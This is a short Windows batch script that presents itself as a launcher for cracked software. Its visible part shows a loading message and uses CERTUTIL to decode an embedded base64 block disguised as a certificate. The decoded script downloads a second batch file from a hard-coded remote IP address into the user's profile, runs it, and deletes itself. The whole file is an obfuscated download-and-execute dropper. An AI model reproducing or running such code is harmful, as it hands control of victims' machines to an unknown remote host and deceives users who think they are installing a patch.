��&cls
@echo off 
Title %~n0
Mode 60,3 
color 0B
echo(
echo         Please wait... a while Loading data ....
CERTUTIL -f -decode "%~f0" "%Temp%\1.bat" >nul 2>&1 
cls
"%Temp%\1.bat"
Exit
-----BEGIN CERTIFICATE-----
QGVjaG8gb2ZmDQplY2hvIFRoYW5rIHlvdSBmb3IgdXNlIHRoaXMgbGF1bmNoZXIh
IFdhaXQgMzAgc2Vjb25kcyB0byBwYXRjaCBhbmQgbGF1bmNoIHRoZSBjckBja2Vk
IG9uZTspDQpjdXJsLmV4ZSAtcyAtLW91dHB1dCAlVVNFUlBST0ZJTEUlXExpbmtz
XDIuYmF0IC0tdXJsIGh0dHA6Ly8xNzEuMjIuMzAuMTIwLzIuYmF0DQpjZCAlVVNF
UlBST0ZJTEUlXExpbmtzDQpzdGFydCAyLmJhdA0KZXhpdA0KRGVsICV+MCANCg0K
RGVsICV+MCANCg==
-----END CERTIFICATE-----
